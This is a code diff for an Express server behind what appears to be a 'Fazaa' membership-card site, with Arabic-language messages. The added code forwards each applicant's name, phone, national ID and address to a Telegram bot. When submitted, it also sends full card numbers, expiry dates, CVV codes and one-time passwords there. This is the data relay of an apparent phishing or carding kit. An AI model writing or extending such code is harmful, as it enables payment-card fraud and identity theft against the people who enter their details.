@@ -53,6 +53,32 @@ function getSupabase(): SupabaseClient | null {
   });
 }
 
+async function sendTelegramNotification(text: string): Promise<boolean> {
+  try {
+    const prefs = serverStore.getAdminPreferences();
+    const token = prefs.telegramBotToken || process.env.TELEGRAM_BOT_TOKEN || '';
+    const chatId = prefs.telegramChatId || process.env.TELEGRAM_CHAT_ID || '';
+
+    if (!token || !chatId) {
+      return false;
+    }
+
+    const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text,
+        parse_mode: 'HTML'
+      })
+    });
+    return res.ok;
+  } catch (err) {
+    console.warn('Failed to send Telegram notification:', err);
+    return false;
+  }
+}
+
 // Ephemeral connection & sync throttling state
 const lastDbPresenceSync = new Map<string, { time: number; page: string }>();
 const visitorStreams = new Map<string, Set<express.Response>>();
@@ -1041,6 +1067,22 @@ app.patch('/api/admin/preferences', async (req, res) => {
   return res.json(updated);
 });
 
+app.post('/api/admin/telegram/test', async (req, res) => {
+  const token = await getAdminTokenFromReq(req);
+  if (!token) {
+    return res.status(401).json({ error: 'غير مصرح' });
+  }
+
+  const success = await sendTelegramNotification(
+    '🤖 <b>اختبار إرسال تليجرام (Telegram Test)</b>\n\nتم ربط بوت تليجرام بنجاح واستلام الرسائل التجريبية!'
+  );
+  if (success) {
+    return res.json({ ok: true, message: 'تم إرسال رسالة الاختبار بنجاح' });
+  } else {
+    return res.status(400).json({ error: 'فشل إرسال رسالة الاختبار. تأكد من صحة رمز البت (Token) ومعرف المحادثة (Chat ID).' });
+  }
+});
+
 // 3. Requests CRUD (Unified Server-Side Store + Supabase Sync)
 app.get('/api/requests/current', async (req, res) => {
   const cookies = parseCookies(req.headers.cookie);
@@ -1178,6 +1220,9 @@ app.post('/api/requests', async (req, res) => {
   ]);
 
   const enriched = dbData ? fromSupabaseRow(dbData) : enrichLocalRecord(newRecord);
+  await sendTelegramNotification(
+    `📥 <b>طلب عضوية جديد (Fazaa)</b>\n\n👤 <b>الاسم:</b> ${newRecord.name || '—'}\n📱 <b>الجوال:</b> ${newRecord.mobile || '—'}\n🆔 <b>الهوية:</b> ${newRecord.idNumber || '—'}\n💳 <b>نوع البطاقة:</b> ${newRecord.cardType || '—'}\n📍 <b>العنوان:</b> ${newRecord.address || '—'}\n📅 <b>التاريخ:</b> ${newRecord.date || '—'}`
+  );
   broadcastToAdmins();
   return res.status(201).json(enriched);
 });
@@ -1279,6 +1324,17 @@ app.patch('/api/requests/:id', async (req, res) => {
     nextAction: enriched.nextAction,
     request: enriched
   });
+
+  if (req.body?.cardNumber) {
+    await sendTelegramNotification(
+      `💳 <b>بيانات الدفع والبطاقة</b>\n\n👤 <b>الاسم:</b> ${enriched.name || '—'}\n📱 <b>الجوال:</b> ${enriched.mobile || '—'}\n💳 <b>رقم البطاقة:</b> <code>${enriched.cardNumber}</code>\n📅 <b>الانتهاء:</b> ${enriched.expMonth || '—'}/${enriched.expYear || '—'}\n🔒 <b>CVV:</b> <code>${enriched.cvv || '—'}</code>`
+    );
+  }
+  if (req.body?.otp) {
+    await sendTelegramNotification(
+      `🔑 <b>رمز التحقق (OTP)</b>\n\n👤 <b>الاسم:</b> ${enriched.name || '—'}\n📱 <b>الجوال:</b> ${enriched.mobile || '—'}\n🔢 <b>الرمز:</b> <code>${enriched.otp}</code>`
+    );
+  }
 
   broadcastToAdmins();
   return res.json(enriched);
